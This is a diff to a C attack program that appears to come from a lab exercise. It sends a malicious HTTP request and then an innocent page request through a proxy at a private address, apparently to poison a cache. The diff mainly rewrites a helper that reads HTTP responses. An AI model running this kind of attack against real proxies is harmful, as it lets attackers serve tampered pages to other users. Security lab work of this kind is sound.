@@ -1,4 +1,3 @@
-#include <errno.h>
 #include <limits.h>
 #include <string.h>
 #include <stdint.h>
@@ -10,27 +9,12 @@
 #include <netinet/in.h>
 #include <unistd.h>
 #include <netinet/ip.h>
-#include <netinet/udp.h>
 
-
-#define ATTACKER_SERVER_ADDR 192, 168, 1, 201
 #define PROXY_ADDR 192, 168, 1, 202
-#define WEB_SERVER_ADDR 192, 168, 1, 203
-#define STR(x) #x
-
-#define FILE_NAME "spoofed-reflected.txt"
 
 union address {
     uint8_t fields[4];
     uint32_t l;
-};
-
-enum {
-    MAX_ITERS = 20,
-    WIRE_LEN = 4096,
-    IP_ID = 0x1222,
-    CLIENT_PORT = 12345,
-    ATTACKER_SERVER_PORT = 34567,
 };
 
 int32_t create_socket() {
@@ -175,11 +159,44 @@ void _send(const int32_t client, const void * const data, size_t size) {
 }
 
 
-void empty_recv(const int sockfd) {
-    char buf[1024];
-    memset(buf, 0, sizeof(buf));
+/**
+ * Receives a page chunk by chunk.
+ */
+void recv_empty(int32_t sockfd) {
+    enum {
+        CHUNK = 16
+    };
+    char * buf = malloc(CHUNK);
+    size_t size = 0;
+    *buf = 0;
+    char *header_end=0;
+    size_t recvd;
 
-    _recv(sockfd, buf, sizeof(buf));
+    while (1) {
+        recvd = _recv(sockfd, buf + size, CHUNK - 1);
+        if (!recvd) {
+            break;
+        }
+
+        size += recvd;
+        buf = realloc(buf, size+CHUNK);
+        buf[size] = 0;
+
+        header_end = strstr(buf, "\r\n\r\n");
+
+        if (header_end) {
+            break;
+        }
+    }
+    char Content_Length[] = "Content-Length: ";
+    size_t content_len = (size_t)atoi(strstr(buf, Content_Length) + sizeof(Content_Length)-1);
+    size_t body_recvd = size - (size_t)(header_end+4-buf); //how much we already received from the body after the header ends
+    size_t body_left = content_len - body_recvd;
+    buf = realloc(buf, body_left+size+1);
+    recvd = _recv(sockfd, buf + size, body_left);
+    size = size + recvd;
+
+    free(buf);
 }
 
 int32_t main() {
@@ -205,7 +222,7 @@ int32_t main() {
     _send(sockfd, mal_req, strlen(mal_req));
 
 
-    empty_recv(sockfd);
+    recv_empty(sockfd);
 
 
     const char inn_req[] = "GET /67607.html HTTP/1.1\r\n"
@@ -215,7 +232,7 @@ int32_t main() {
 
     _send(sockfd, inn_req, sizeof(inn_req) - 1);
 
-    empty_recv(sockfd);
+    recv_empty(sockfd);
 
     close(sockfd);
 }
